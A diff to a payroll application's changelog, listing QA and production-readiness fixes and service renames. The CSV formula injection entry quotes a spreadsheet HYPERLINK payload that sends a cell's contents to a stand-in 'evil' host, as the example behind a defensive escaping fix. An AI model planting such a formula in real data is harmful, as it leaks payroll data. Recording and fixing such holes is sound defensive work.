@@ -7,6 +7,133 @@ versions follow [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+### Fixed — Extreme QA pass
+
+- **PWA manifest broke on deep SPA URLs**: `frontend/index.html` switched
+  the manifest link from `/manifest.webmanifest` to `manifest.webmanifest`
+  in the prior commit. With no `<base>` element the browser resolved
+  the relative href against the document URL — a user landing on
+  `/payroll/dashboard/employees/123` requested
+  `/payroll/dashboard/employees/manifest.webmanifest`, which the SPA
+  fallback served as `index.html`, breaking PWA install on every
+  non-root entry point. Reverted to the absolute form so Vite rebases
+  it via `base` at build time.
+- **Multi-app `VITE_BASE_PATH` was a no-op**: `frontend/vite.config.ts`
+  read the build var via Vite's `loadEnv()`, which only walks `.env*`
+  files — not the parent shell. The Dockerfile and grouped overlay
+  pass it as an `ARG → ENV` process variable, so the multi-app build
+  was silently producing a single-app bundle and the Dockerfile's
+  `mv dist/* dist-prefixed/payroll/` step then created
+  `/payroll/index.html` referencing `/assets/...` paths that 404'd
+  at the SPA's actual URL. Fall back to `process.env.VITE_BASE_PATH`.
+- **Vite doesn't rebase `<link rel="manifest">`**: even with the
+  absolute href, Vite's HTML asset rewriter only touches
+  `rel="icon"` / `stylesheet` / scripts. Added a `transformIndexHtml`
+  hook in the manifest plugin that rewrites the href to
+  `${basePath}manifest.webmanifest` so single- and multi-app builds
+  both produce a working URL.
+- **Retention sweep never pruned export CSVs**: `payroll-exports/engine.ts`
+  writes to `EXPORTS_DIR/<companyId>/<file>`, but `retention.ts` did a
+  flat `readdir` and `isFile()`-rejected the company subdirectories.
+  Disk grew unbounded since the per-company-subdir refactor. Now walks
+  one level deep; legacy flat-layout files still pruned in place.
+- **Notification email leaked Mustache markup**: the template renderer
+  only handled `{{key}}` interpolation, so the
+  `correction_request_decided` HTML email shipped raw
+  `{{#reviewNote}}<p>Note: …</p>{{/reviewNote}}` text to managers when
+  no review note was supplied. Added a section-tag pre-pass; whitespace-
+  only values treated as missing; HTML escaping preserved.
+- **License middleware coverage gap**: `enforceLicense` was only on
+  `/punch/*`, `/manual-entries/*`, `/kiosk/*`. Per BUILD_PLAN, an expired
+  license must block "no edits, no approvals" — but timesheet entry
+  create/edit/delete, period approve/unapprove, correction-request
+  decisions, and AI nl-correction-apply could all bypass it. Now applied
+  to all six routes. Short-circuits when `LICENSING_ENFORCED=false` (v1
+  default) so no runtime change today; flipping the env flag closes
+  the hole.
+- **CSV formula injection in payroll exports + reports**: `csv.ts:formatCell`
+  and `csv-stream.ts:csvCell` only RFC-4180-quoted `,"\r\n` and let cells
+  starting with `= + - @ \t \r` pass through. An employee whose first name
+  was `=HYPERLINK("http://evil/?x="&A1,…)` would exfiltrate a co-worker's
+  cell when the CPA admin opened the payroll-relief CSV in Excel. Now
+  prefixes a single quote on those leads to neutralize formula evaluation
+  per OWASP guidance. Costs a cosmetic `'-7` on naturally-negative numeric
+  cells; no payroll field emits negatives in v1.
+- **Outbound HTTP fetches had no timeout**: `emailit-client.ts`,
+  `textlinksms-client.ts`, and `licensing/heartbeat.ts` all called
+  `fetch(url, init)` with no `AbortSignal.timeout`. A stuck TLS handshake
+  to an upstream provider would block the every-5-minutes missed-punch
+  cron / nightly heartbeat indefinitely. Added 15 s ceiling for the
+  SMS+email clients (covers their p99) and 10 s for the heartbeat
+  (offline-tolerant by design). Distinguishes timeout from generic
+  network error in the thrown message so operator logs are actionable.
+- **4 regression-test files** lock in the above:
+  `notifications/__tests__/templates.test.ts`,
+  `__tests__/retention-export-files.test.ts`,
+  `payroll-exports/__tests__/csv.test.ts`. Adds 25 new unit tests; full
+  suite stable at 251 passing (247 backend + 4 frontend).
+
+### Fixed — Production-readiness audit
+
+- **Payroll exports persisted across upgrades**: `docker-compose.prod.yml`
+  now mounts a named `exports` volume at `/app/exports`. Before this,
+  `update.sh` recreated the api container and orphaned every CSV — the
+  `payroll_exports` rows survived but the files were gone, so re-download
+  from the export history returned 404. The image's `/app/exports` is
+  pre-created as `vibept:vibept` so the non-root api process can mkdir
+  per-company subdirectories on first export
+- **WAL archive directory pre-chowned to postgres uid 70**: `install.sh`
+  now creates `${WAL_ARCHIVE_DIR:-/var/backups/vibept-wal}` with `70:70`
+  ownership before bringing the stack up. Without this, docker auto-
+  creates the host bind-mount as `root:root` and Postgres' `archive_command`
+  silently fails — WAL files pile up in `pg_wal` until the volume fills
+  and the database stops accepting writes
+- **Install/update scripts no longer call `docker compose build`**: prod
+  Compose has no `build:` directives, so the build step was a no-op that
+  computed and exported `APP_VERSION` / `GIT_SHA` / `BUILD_DATE` build
+  args nothing consumed. `install.sh` and `update.sh` now `pull` instead
+  of `build`. `update.sh`'s function rename `build_images` → `pull_images`
+  is internal-only
+- **CI now actually runs the integration suite**: previously the workflow
+  created database `vibept` while `backend/vitest.config.ts` defaults the
+  test DB to `vibept_test` on port `5437`. Result: every integration test
+  silently `skipIf(!dbReachable)`'d on a hidden hole. CI now publishes
+  postgres on `5437`, creates `vibept_test`, runs migrations against it,
+  then runs the suite. The 120 integration tests that previously skipped
+  in CI now execute
+
+### Changed — Vibe distribution-plan alignment
+
+- Compose services renamed to follow the Vibe distribution convention
+  (`vibe-distribution-plan.md`): `backend` → `api`, `frontend` → `web`.
+  Container names follow: `vibept-backend` → `vibept-api`,
+  `vibept-frontend` → `vibept-web`. Operators using the in-repo
+  `scripts/get.sh` installer pick up the rename automatically on next
+  update; the rollback-tag pair is now `vibept-rollback-{api,web}:previous`.
+- GHCR images renamed: `ghcr.io/kisaesdevlab/vibept-backend` →
+  `vibe-payroll-api`, `ghcr.io/kisaesdevlab/vibept-frontend` →
+  `vibe-payroll-web`. The same tag scheme (`:latest`, `:X.Y.Z`,
+  `:main`, `:sha-<short>`) applies. Existing image tags under the old
+  names remain in GHCR; CI now publishes to the new names only.
+- `docker-compose.dev.yml` renamed to `docker-compose.yml` so a fresh
+  clone runs the dev stack with `docker compose up`. Default Postgres
+  host port shifted from `5432` → `5437` and pgAdmin from `5050` →
+  `5052` so multiple Vibe apps' DBs can coexist on the same dev
+  workstation. Override `POSTGRES_PUBLISH_PORT` / `PGADMIN_PUBLISH_PORT`
+  in `.env` if you need the legacy ports.
+- New `docker-compose.grouped.yml` overlays `docker-compose.yml` to
+  build api + web from source, join an externally-managed
+  `vibe_ingress` network, and serve the SPA under `/payroll/`. Used to
+  test multi-app deployment shape locally; see README.
+- New `VITE_BASE_PATH` build arg + Vite `base` plumbing. PWA manifest
+  is now emitted dynamically from the resolved base path (no static
+  `frontend/public/manifest.webmanifest`). Service-worker registration
+  uses `import.meta.env.BASE_URL` so it works under any prefix.
+- Backend env schema accepts `COOKIE_PATH` and `COOKIE_SECURE`. Currently
+  no-ops (auth is bearer-token); plumbed for a future cookie middleware.
+- `docker-compose.prod.yml` no longer carries `build:` directives —
+  prod is image-pull only. Build from source via the grouped overlay.
+
 ### Added — Cross-company admin + account recovery + release hardening
 
 - **Cross-company users view** (`/appliance/users`): SuperAdmin-only matrix-style
